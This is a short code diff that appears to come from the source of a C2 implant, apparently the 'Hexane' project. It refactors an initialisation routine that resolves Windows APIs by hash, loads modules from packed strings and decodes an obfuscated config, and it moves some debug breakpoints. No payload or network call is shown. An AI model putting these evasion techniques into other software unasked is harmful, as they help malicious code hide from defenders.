@@ -48,14 +48,12 @@ namespace Core {
         HEXANE
         Ctx->LE = TRUE;
 
-        PARSER Parser = { };
+        PARSER Parser               = { };
+        ULONG Kernel32              = { };
+        OSVERSIONINFOW OSVersionW   = { };
 
-        __debugbreak();
         CreateParser(&Parser, Strings, 256);
         x_memset(Strings, 0, 256);
-
-        ULONG KERNEL32              = { };
-        OSVERSIONINFOW OSVersionW   = { };
 
         if (!(FPTR2(Ctx->Nt.RtlGetVersion, NTDLL, RTLGETVERSION))) {
             return_defer(ERROR_PROC_NOT_FOUND);
@@ -94,12 +92,12 @@ namespace Core {
         }
 
         if (Ctx->Session.OSVersion >= WIN_VERSION_2016_X) {
-            KERNEL32 = (KERNEL10);
+            Kernel32 = (KERNEL10);
         } else {
-            KERNEL32 = (KERNEL7);
+            Kernel32 = (KERNEL7);
         }
 
-        if (!(Ctx->Modules.kernel32 = LdrGetModuleAddress(KERNEL32))) {
+        if (!(Ctx->Modules.kernel32 = LdrGetModuleAddress(Kernel32))) {
             return_defer(ERROR_PROC_NOT_FOUND);
         }
         if(
@@ -202,7 +200,6 @@ namespace Core {
             return_defer(ERROR_PROC_NOT_FOUND);
         }
 
-        __debugbreak();
         if ((FPTR(Ctx->win32.LoadLibraryA, Ctx->Modules.kernel32, LOADLIBRARYA))) {
             if (
                 !(Ctx->Modules.crypt32 = Ctx->win32.LoadLibraryA(UnpackString(&Parser, nullptr))) ||
@@ -259,6 +256,7 @@ namespace Core {
         PARSER Parser       = { };
         BYTE InitKey[16]    = { OBF_KEY };
 
+        __debugbreak();
         CreateParser(&Parser, Config, sizeof(Config));
         x_memset(Config, 0, 512);
 
